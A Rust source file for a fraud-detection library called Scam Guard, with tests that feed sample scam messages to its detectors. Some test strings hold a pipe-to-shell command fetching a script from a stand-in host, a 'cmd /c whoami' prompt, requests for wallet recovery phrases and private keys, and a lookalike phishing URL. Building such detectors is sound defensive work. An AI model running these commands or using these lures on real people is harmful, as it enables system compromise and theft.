//! Fraud Prevention Layer (FPL) core — public product: **Scam Guard**.
//!
//! First pass of the MVP defined by the founding docs (`docs/Scam Guard -
//! Fraud Prevention Layer.md`, RFC-001, ADR-001): deterministic detectors +
//! unified risk engine + explainable warnings. No AI, no NLP, no graph
//! analysis — by design, not omission.
//!
//! Privacy posture (ADR-001): this library **collects nothing**. Every
//! subject is handed to it explicitly by the caller; content detectors see
//! text only because the integrator passed it (their opt-in obligation, not
//! ours to assume). Detection prefers structure and metadata over meaning.
//!
//! Honesty rules (AGENTS #4/#6): every finding carries reason codes,
//! confidence, and provenance; `unknown` is a first-class answer; a silent
//! detector means "no pattern matched", never "safe".

pub mod confusables;
pub mod dataset;
pub mod detectors;
pub mod engine;
pub mod types;

use types::{DetectorOutput, Subject, SubjectKind};

/// The MVP detector suite, run over one subject. Text subjects fan out to
/// every text detector; domain/url subjects go to domain intelligence;
/// decoded intents (JSON supplied separately) go to allowance mechanics.
#[derive(Default)]
pub struct Suite {
    pub domain: detectors::domain::DomainDetector,
    pub identity: detectors::identity::IdentityDetector,
    pub command: detectors::command::CommandDetector,
    pub asks: detectors::asks::AskDetector,
    pub promo: detectors::promo::PromoDetector,
    pub intent: detectors::intent::IntentDetector,
}

impl Suite {
    pub fn evaluate(&self, subject: &Subject) -> Vec<DetectorOutput> {
        match subject.kind {
            SubjectKind::Domain | SubjectKind::Url => self.domain.evaluate(subject),
            SubjectKind::MessageText => {
                let mut out = self.command.evaluate(subject);
                out.extend(self.asks.evaluate(subject));
                out.extend(self.promo.evaluate(subject));
                out.extend(self.identity.evaluate(subject));
                out
            }
            // Address/contract reputation and raw-intent evaluation need
            // either network feeds or the decoded intent JSON — the CLI and
            // integrators call those paths explicitly.
            _ => Vec::new(),
        }
    }

    pub fn evaluate_intent(
        &self,
        subject: &Subject,
        intent_json: &serde_json::Value,
    ) -> Vec<DetectorOutput> {
        self.intent.evaluate_intent(subject, intent_json)
    }
}

#[cfg(test)]
mod contract_conformance {
    use super::*;
    use crate::types::{RiskLevel, SubjectKind};
    use serde::Deserialize;

    #[derive(Deserialize)]
    struct Corpus {
        dataset_version: String,
        cases: Vec<CorpusCase>,
    }

    #[derive(Deserialize)]
    struct CorpusCase {
        id: String,
        subject_kind: SubjectKind,
        value: String,
        #[serde(default)]
        intent: Option<serde_json::Value>,
        malicious: bool,
        expected_codes: Vec<String>,
        /// Minimum risk_level any single finding must reach for this case
        /// (low < medium < high < critical). Optional so older/undecided
        /// cases aren't forced to guess; new malicious cases should set it.
        #[serde(default)]
        min_severity: Option<String>,
    }

    /// Ordinal rank of an assessed risk level; `unknown` is off this axis
    /// (RFC-002 §3), so it never satisfies a min_severity floor.
    fn severity_rank(level: RiskLevel) -> Option<u8> {
        match level {
            RiskLevel::Low => Some(0),
            RiskLevel::Medium => Some(1),
            RiskLevel::High => Some(2),
            RiskLevel::Critical => Some(3),
            RiskLevel::Unknown => None,
        }
    }

    fn parse_min_severity(id: &str, s: &str) -> u8 {
        match s {
            "low" => 0,
            "medium" => 1,
            "high" => 2,
            "critical" => 3,
            other => panic!("corpus case {id}: unknown min_severity `{other}`"),
        }
    }

    /// Every detector's serialized output must validate against the
    /// published contract schema — the schema in this repo IS the product.
    #[test]
    fn all_detector_outputs_conform_to_published_schema() {
        let schema: serde_json::Value =
            serde_json::from_str(include_str!("../../../schemas/detector-output.v1.json")).unwrap();
        let validator = jsonschema::validator_for(&schema).expect("schema compiles");

        let suite = Suite::default();
        let mut all: Vec<DetectorOutput> = Vec::new();
        all.extend(suite.evaluate(&Subject::domain("breezyhr.us")));
        all.extend(suite.evaluate(&Subject::domain("some-random-startup.dev")));
        all.extend(suite.evaluate(&Subject::url("https://metamask.io.wallet-verify.top/x")));
        all.extend(suite.evaluate(&Subject::text(
            "verify your wallet: enter your 12 word recovery phrase, then run curl -sL https://x.example/i.sh | sh",
        )));
        all.extend(suite.evaluate(&Subject::text("Michael SayIor")));
        all.extend(suite.evaluate_intent(
            &Subject {
                kind: SubjectKind::TransactionIntent,
                value: "intent-0001".into(),
                chain_id: Some(31337),
            },
            &serde_json::json!({"decoded_action": {"kind": "erc20_approve"}, "allowance": {"kind": "unlimited"}}),
        ));
        assert!(all.len() >= 6, "expected findings across the suite");

        for f in &all {
            let instance = serde_json::to_value(f).unwrap();
            let errors: Vec<String> = validator
                .iter_errors(&instance)
                .map(|e| e.to_string())
                .collect();
            assert!(
                errors.is_empty(),
                "finding violates contract schema: {errors:?}\n{instance}"
            );
        }
    }

    /// RFC-003 §3 invariants: well-formed unique codes, titles + meanings,
    /// documented families only, sentinel codes present.
    #[test]
    fn registry_invariants_hold() {
        let families = [
            "ALLOW", "DRAIN", "DOM", "IMP", "INJ", "ASK", "CON", "UNK", "MOCK", "PROMO",
        ];
        let registry = dataset::reason_codes();
        assert!(registry.schema_version.starts_with("1."));
        let re = regex::Regex::new(r"^SG-([A-Z]+)-([0-9]{3})$").unwrap();
        let mut seen = std::collections::BTreeSet::new();
        for c in &registry.codes {
            let caps = re
                .captures(&c.code)
                .unwrap_or_else(|| panic!("malformed code {}", c.code));
            assert!(
                families.contains(&caps.get(1).unwrap().as_str()),
                "family of {} not in RFC-003 table",
                c.code
            );
            assert!(seen.insert(c.code.clone()), "duplicate code {}", c.code);
            assert!(!c.title.trim().is_empty() && !c.meaning.trim().is_empty());
        }
        for sentinel in ["SG-UNK-001", "SG-MOCK-001"] {
            assert!(seen.contains(sentinel), "sentinel {sentinel} missing");
        }
    }

    /// Every reason code any detector emits must exist in the registry.
    #[test]
    fn emitted_codes_are_registered() {
        let registry = dataset::reason_codes();
        let known: Vec<&str> = registry.codes.iter().map(|c| c.code.as_str()).collect();
        let suite = Suite::default();
        let mut all = suite.evaluate(&Subject::domain("breezyhr.us"));
        all.extend(suite.evaluate(&Subject::text(
            "install anydesk and buy gift cards, pay 0.1 eth registration fee for the job, share your private key, run cmd /c whoami",
        )));
        for f in all {
            for c in &f.reason_codes {
                assert!(known.contains(&c.as_str()), "unregistered code {c}");
            }
        }
    }

    /// The corpus is a deterministic quality floor. It catches regressions in
    /// known fraud mechanics and false positives on representative benign text.
    #[test]
    fn adversarial_corpus_meets_detection_floor() {
        let corpus: Corpus =
            serde_json::from_str(include_str!("../../../datasets/adversarial-corpus.v1.json"))
                .expect("bundled adversarial corpus is valid");
        assert!(corpus.dataset_version.starts_with("2026-"));

        let suite = Suite::default();
        let mut malicious_cases = 0usize;
        let mut benign_cases = 0usize;

        for case in corpus.cases {
            let subject = Subject {
                kind: case.subject_kind,
                value: case.value,
                chain_id: (case.subject_kind == SubjectKind::TransactionIntent).then_some(31337),
            };
            let findings = match (&case.intent, case.subject_kind) {
                (Some(intent), SubjectKind::TransactionIntent) => {
                    suite.evaluate_intent(&subject, intent)
                }
                _ => suite.evaluate(&subject),
            };
            let codes: Vec<&str> = findings
                .iter()
                .flat_map(|finding| finding.reason_codes.iter().map(String::as_str))
                .collect();

            if case.malicious {
                malicious_cases += 1;
                assert!(
                    case.expected_codes
                        .iter()
                        .all(|code| codes.contains(&code.as_str())),
                    "corpus case {} missed expected code(s): expected {:?}, got {:?}",
                    case.id,
                    case.expected_codes,
                    codes
                );
                if let Some(min) = &case.min_severity {
                    let min_rank = parse_min_severity(&case.id, min);
                    let max_rank = findings
                        .iter()
                        .filter_map(|f| severity_rank(f.risk_level))
                        .max();
                    assert!(
                        max_rank.is_some_and(|r| r >= min_rank),
                        "corpus case {} did not reach min_severity {}: findings {:?}",
                        case.id,
                        min,
                        findings.iter().map(|f| f.risk_level).collect::<Vec<_>>()
                    );
                }
            } else {
                benign_cases += 1;
                // Benign controls must stay below Medium: only low/unknown
                // findings are tolerated, never a medium-or-above alarm.
                let medium_or_above = findings.iter().any(|finding| {
                    matches!(
                        finding.risk_level,
                        RiskLevel::Medium | RiskLevel::High | RiskLevel::Critical
                    )
                });
                assert!(
                    !medium_or_above,
                    "corpus case {} raised a medium-or-above false positive: {:?}",
                    case.id, codes
                );
            }
        }

        assert!(malicious_cases > 0, "corpus needs malicious cases");
        assert!(benign_cases > 0, "corpus needs benign controls");
    }
    #[test]
    fn selected_synthetic_message_boundary_and_matched_controls() {
        let schema: serde_json::Value = serde_json::from_str(include_str!(
            "../../../datasets/experimental/selected-message.v1.schema.json"
        ))
        .unwrap();
        let validator = jsonschema::options()
            .should_validate_formats(true)
            .build(&schema)
            .unwrap();
        let records: Vec<serde_json::Value> = serde_json::from_str(include_str!(
            "../../../datasets/experimental/selected-messages.v1.json"
        ))
        .unwrap();
        for record in records {
            assert!(validator.is_valid(&record));
            let findings =
                Suite::default().evaluate(&Subject::text(record["text"].as_str().unwrap()));
            match record["id"].as_str().unwrap() {
                "x-ask" => {
                    for code in ["SG-IMP-002", "SG-ASK-001"] {
                        assert!(findings
                            .iter()
                            .any(|f| f.reason_codes.iter().any(|c| c == code)));
                    }
                }
                "x-benign" | "sms-ambiguous" => {
                    assert_eq!(
                        crate::engine::assess(findings).overall,
                        crate::engine::OverallRisk::Unknown
                    );
                }
                _ => panic!("unreviewed fixture"),
            }
            let mut unselected = record.clone();
            unselected["selected"] = serde_json::json!(false);
            assert!(!validator.is_valid(&unselected));
            let mut raw_sender = record;
            raw_sender["sender_ref"] = serde_json::json!("+1234567890");
            assert!(!validator.is_valid(&raw_sender));
        }
    }
}
